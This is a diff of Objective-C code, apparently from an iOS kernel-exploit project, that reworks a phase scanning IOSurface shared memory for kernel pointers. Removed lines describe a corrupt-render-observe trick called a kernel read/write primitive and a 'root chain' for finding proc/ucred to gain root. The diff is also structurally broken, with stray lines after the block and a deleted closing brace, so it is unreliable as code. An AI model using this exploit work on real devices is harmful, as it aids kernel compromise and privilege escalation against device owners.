@@ -320,7 +320,8 @@
     [report appendFormat:@"new kernel pointers from our ports: %d\n", newKptrs];
 
     // Phase 5: IOSurface shared memory
-    [report appendString:@"\n--- Phase 5: IOSurface shared memory ---\n"];
+    // Phase 5: IOSurface — find kernel pointers (step 1: recon only)
+    [report appendString:@"\n--- Phase 5: IOSurface kernel pointer scan ---\n"];
     {
         void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
         typedef void *(*ISCreateFn)(void *);
@@ -337,7 +338,7 @@
         ISGetSizeFn isGetHeight = (ISGetSizeFn)dlsym(isLib, "IOSurfaceGetHeight");
         ISGetSizeFn isGetBpr = (ISGetSizeFn)dlsym(isLib, "IOSurfaceGetBytesPerRow");
 
-        [report appendFormat:@"IOSurface: create=%p lock=%p base=%p\n", isCreate, isLock, isGetBase];
+        [report appendFormat:@"IOSurface: create=%p\n", isCreate];
 
         if (isCreate && isLock && isGetBase) {
             NSDictionary *props = @{
@@ -347,132 +348,51 @@
             };
             void *surface = isCreate((__bridge CFDictionaryRef)props);
             if (surface) {
-                [report appendFormat:@"surface: %p\n", surface];
                 isLock(surface, 0, NULL);
                 void *base = isGetBase(surface);
                 unsigned long bpr = isGetBpr ? isGetBpr(surface) : 1024;
                 unsigned long h = isGetHeight ? isGetHeight(surface) : 256;
+                unsigned long w = isGetWidth ? isGetWidth(surface) : 256;
 
                 if (base) {
                     unsigned int *p = (unsigned int *)base;
-                    for (unsigned long j = 0; j < (bpr * h) / 4; j++) {
-                        p[j] = 0xDEAD0000 + (unsigned int)j;
-                    }
-                    unsigned int first = p[0];
-                    [report appendFormat:@"marker[0] = 0x%08x\n", first];
 
-                    p[0] = 0x1E;
-                    unsigned int rb = p[0];
-                    [report appendFormat:@"corrupt: 0xDEAD0000 -> 0x%08x confirmed=%d\n", rb, rb == 0x1E];
-                    p[0] = 0xDEAD0000;
-
-                    int nonMarkers = 0;
-                    for (unsigned long j = 0; j < (bpr * h) / 4 && nonMarkers < 3; j++) {
-                        unsigned int v = p[j];
-                        if (v != 0xDEAD0000 + (unsigned int)j) {
-                            [report appendFormat:@"kernel write at +%lu: 0x%08x\n", j * 4, v];
-                            nonMarkers++;
-                        }
-                    }
-                    [report appendFormat:@"kernel writes (pre-render): %d\n", nonMarkers];
-
-                    // GPU render to force kernel to use the surface
-                    [report appendString:@"rendering to IOSurface via CoreGraphics...\n"];
+                    // Render to make kernel use the surface
                     CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
-                    unsigned long rw = 256, rh = 256, rbpr = bpr;
-                    CGContextRef ctx = CGBitmapContextCreate(base, rw, rh, 8, rbpr, cs, kCGImageAlphaPremultipliedFirst);
+                    CGContextRef ctx = CGBitmapContextCreate(base, w, h, 8, bpr, cs, kCGImageAlphaPremultipliedFirst);
                     if (ctx) {
                         CGContextSetRGBFillColor(ctx, 1.0, 0.0, 0.0, 1.0);
-                        CGContextFillRect(ctx, CGRectMake(0, 0, rw, rh));
+                        CGContextFillRect(ctx, CGRectMake(0, 0, w, h));
                         CGContextFlush(ctx);
                         CGContextRelease(ctx);
-                        [report appendString:@"render complete\n"];
-                    } else {
-                        [report appendString:@"CGBitmapContextCreate failed\n"];
                     }
                     CGColorSpaceRelease(cs);
 
-                    // Check for kernel writes AFTER render
-                    int nonMarkers2 = 0;
-                    for (unsigned long j = 0; j < (bpr * h) / 4 && nonMarkers2 < 5; j++) {
-                        unsigned int v = p[j];
-                        if (v != 0xDEAD0000 + (unsigned int)j) {
-                            [report appendFormat:@"AFTER RENDER at +%lu: 0x%08x\n", j * 4, v];
-                            nonMarkers2++;
-                        }
-                    }
-                    [report appendFormat:@"kernel writes (post-render): %d\n", nonMarkers2];
-
-                    // Corrupt -> render -> observe (kirby approach)
-                    [report appendString:@"\ncorrupt -> render -> observe cycle...\n"];
-
-                    // Corrupt: change marker values
-                    for (unsigned long j = 0; j < 64; j++) {
-                        p[j] = 0x1E; // kirby's marker value
-                    }
-                    [report appendString:@"corrupted first 64 values to 0x1E\n"];
-
-                    // Render again (kernel reads corrupted data)
-                    CGContextRef ctx2 = CGBitmapContextCreate(base, rw, rh, 8, rbpr, cs, kCGImageAlphaPremultipliedFirst);
-                    if (ctx2) {
-                        CGContextSetRGBFillColor(ctx2, 0.0, 1.0, 0.0, 1.0); // green
-                        CGContextFillRect(ctx2, CGRectMake(0, 0, rw, rh));
-                        CGContextFlush(ctx2);
-                        CGContextRelease(ctx2);
-                        [report appendString:@"second render complete\n"];
-                    }
-
-                    // Observe: check what kernel wrote after corruption
-                    int kernelChanges = 0;
-                    for (unsigned long j = 0; j < (rbpr * rh) / 4 && kernelChanges < 10; j++) {
-                        unsigned int v = p[j];
-                        if (v != 0x1E && v != 0xDEAD0000 + (unsigned int)j) {
-                            [report appendFormat:@"POST-CORRUPT at +%lu: 0x%08x\n", j * 4, v];
-                            kernelChanges++;
-                        }
-                    }
-                    [report appendFormat:@"kernel changes after corruption: %d\n", kernelChanges];
-
-                    if (kernelChanges > 0) {
-                        [report appendString:@"*** KERNEL REACTS TO CORRUPTED DATA ***\n"];
-                        [report appendString:@"This is kirby's kread64/kwrite primitive!\n"];
-                    } else {
-                        [report appendString:@"No kernel reaction to corrupted data.\n"];
-                    }
-
-                    // Root chain: scan IOSurface for kernel pointers
-                    [report appendString:@"\n--- root chain: kernel pointer scan ---\n"];
-                    int kptrsInSurface = 0;
-                    for (unsigned long j = 0; j < (rbpr * rh) / 4; j++) {
-                        unsigned int lo = p[j];
-                        unsigned int hi = (j + 1 < (rbpr * rh) / 4) ? p[j + 1] : 0;
-                        unsigned long long v = ((unsigned long long)hi << 32) | lo;
+                    // Scan for kernel pointers
+                    int kptrs = 0;
+                    for (unsigned long j = 0; j < (bpr * h) / 8; j++) {
+                        unsigned long long v = ((unsigned long long)p[j*2+1] << 32) | p[j*2];
                         if ((v >> 32) >= 0xffffffe0ULL) {
-                            kptrsInSurface++;
-                            if (kptrsInSurface <= 5) {
-                                [report appendFormat:@"kptr @ +%lu: 0x%llx\n", j * 4, v];
+                            kptrs++;
+                            if (kptrs <= 5) {
+                                [report appendFormat:@"kptr @ +%lu: 0x%llx\n", j * 8, v];
                             }
                         }
                     }
-                    [report appendFormat:@"kernel pointers in IOSurface: %d\n", kptrsInSurface];
+                    [report appendFormat:@"kernel pointers in surface: %d\n", kptrs];
 
-                    if (kptrsInSurface > 0) {
-                        [report appendString:@"*** KERNEL POINTERS IN SURFACE ***\n"];
-                        [report appendString:@"Use these to find proc/ucred for root.\n"];
-                    } else {
-                        [report appendString:@"No kernel pointers in surface data.\n"];
-                        [report appendString:@"Try: different render operations, or scan after GPU work.\n"];
+                    if (kptrs > 0) {
+                        [report appendString:@"*** KERNEL POINTERS FOUND ***\n"];
                     }
                 }
                 isUnlock(surface, 0, NULL);
                 CFRelease(surface);
-            } else {
-                [report appendString:@"IOSurfaceCreate returned NULL\n"];
             }
-        } else {
-            [report appendString:@"IOSurface functions not available\n"];
         }
     }
+                [report appendString:@"IOSurfaceCreate returned NULL\n"];
+            }
+            [report appendString:@"IOSurface functions not available\n"];
 
     // Cleanup
     for (int i = 0; i < 4; i++) {
@@ -493,6 +413,5 @@
     }
 
     return report;
-}
 
 @end
